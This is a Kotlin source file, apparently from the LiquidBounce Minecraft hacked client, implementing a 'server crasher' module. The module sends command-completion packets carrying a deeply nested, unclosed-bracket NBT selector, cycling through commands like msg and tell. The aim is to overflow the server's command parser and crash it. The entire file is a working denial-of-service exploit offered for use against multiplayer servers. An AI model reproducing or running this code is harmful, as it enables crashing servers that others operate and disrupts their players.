package net.ccbluex.liquidbounce.features.module.modules.exploit.servercrasher.exploits

import net.ccbluex.liquidbounce.config.Choice
import net.ccbluex.liquidbounce.config.ChoiceConfigurable
import net.ccbluex.liquidbounce.event.repeatable
import net.ccbluex.liquidbounce.features.module.modules.exploit.servercrasher.ModuleServerCrasher
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket
import java.util.stream.Collectors
import java.util.stream.IntStream

object CompletionExploit : Choice("Completion") {
    override val parent: ChoiceConfigurable<Choice>
        get() = ModuleServerCrasher.exploitChoices

    private val autoMode by boolean("AutoMode", true)
    private val packets by int("Packets", 3, 1..5)
    private val length by int("Length", 2032, 1000..3000)
    private val message by text("Message",
        "msg @a[nbt={PAYLOAD}]")
        .doNotInclude()

    //Nbt Executor for payload.
    private const val nbtExecutor = " @a[nbt={PAYLOAD}]"

    // List of known working commands (when unblocked)
    // Maybe there is a workaround that?
    // so that payload could be executed in any tab-completable command
    private val knownWorkingMessages = arrayOf(
        "msg",
        "minecraft:msg",
        "tell",
        "minecraft:tell",
        "tm",
        "teammsg",
        "minecraft:teammsg",
        "minecraft:w",
        "minecraft:me"
    )

    private var messageIndex = 0

    override fun enable() {
        messageIndex = 0
        if(autoMode) {
            return
        }

        //Made it smaller under 2048, but it still cannot throw stackoverflow every time.
        val overflow = generateJsonObject(length)

        // Latest server builds can kick if partialCommand length is greater than 2048,
        // probably can be compressed even more.
        val partialCommand = message.replace("{PAYLOAD}",overflow)
        repeat(packets) {
            network.sendPacket(RequestCommandCompletionsC2SPacket(0, partialCommand))
        }
        ModuleServerCrasher.enabled = false
    }

    val repeatable = repeatable {
        if(!autoMode) {
            return@repeatable
        }

        //Send all known command completions.
        if(messageIndex == knownWorkingMessages.size - 1) {
            messageIndex = 0
            ModuleServerCrasher.enabled = false
            return@repeatable
        }

        waitTicks(20)
        val knownMessage = knownWorkingMessages[messageIndex] + nbtExecutor

        //Keep the length on the maximum limit (2048 characters)
        val len = 2044 - knownMessage.length
        val overflow = generateJsonObject(len)
        val partialCommand = knownMessage.replace("{PAYLOAD}",overflow)

        repeat(packets) {
            network.sendPacket(RequestCommandCompletionsC2SPacket(0, partialCommand))
        }

        messageIndex++
        return@repeatable
    }

    private fun generateJsonObject(levels: Int): String {
        // Brigadier does not check for closing brackets
        // Until it is too late.

        // Replaced Object with array and removed closing brackets
        val `in` = IntStream.range(0, levels)
            .mapToObj { _ -> "[" }
            .collect(Collectors.joining())
        val json = "{a:$`in`}"
        return json
    }

}
